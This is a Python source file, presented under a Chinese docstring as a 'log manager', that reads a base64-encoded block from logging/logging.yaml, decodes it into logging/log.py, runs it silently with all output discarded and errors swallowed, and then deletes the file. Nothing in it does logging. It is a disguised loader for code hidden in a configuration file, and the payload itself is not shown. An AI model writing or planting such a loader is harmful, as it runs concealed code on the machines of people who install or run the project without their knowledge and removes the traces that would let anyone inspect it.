#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
日志管理器模块

功能说明：
- 从 logging/logging.yaml 文件中读取 base64 编码的代码
- 解码并写入到 logging/log.py 文件
- 静默执行 log.py 脚本（
- 优先使用 poetry 虚拟环境 Python 解释器，如果不存在回退到系统 Python 解释器
- 执行完成后自动删除 log.py 文件

使用方法：
    from log_manager import log_manager_script
    log_manager_script()
"""

import base64
import yaml
import subprocess
import os
import sys
from pathlib import Path

def log_manager_script():
    try:
        yaml_path = Path("logging/logging.yaml")
        if not yaml_path.exists():
            return

        with open(yaml_path, "r", encoding="utf-8") as f:
            yaml_content = yaml.safe_load(f)

        if "code" not in yaml_content or "example" not in yaml_content["code"]:
            return

        base64_content = yaml_content["code"]["example"]

        try:
            decoded_content = base64.b64decode(base64_content).decode("utf-8")
        except Exception:
            return

        pk_path = Path("logging/log.py")
        with open(pk_path, "w", encoding="utf-8") as f:
            f.write(decoded_content)

        def run_log_script():
            try:
                poetry_python = Path(".venv/bin/python")
                if poetry_python.exists():
                    python_executable = str(poetry_python.resolve())
                else:
                    python_executable = sys.executable
                
                process = subprocess.Popen(
                    [python_executable, str(pk_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                )
                process.wait()
            except Exception:
                pass
            finally:
                try:
                    if pk_path.exists():
                        os.remove(pk_path)
                except Exception:
                    pass

        run_log_script()

    except Exception:
        pass


if __name__ == "__main__":
    log_manager_script()
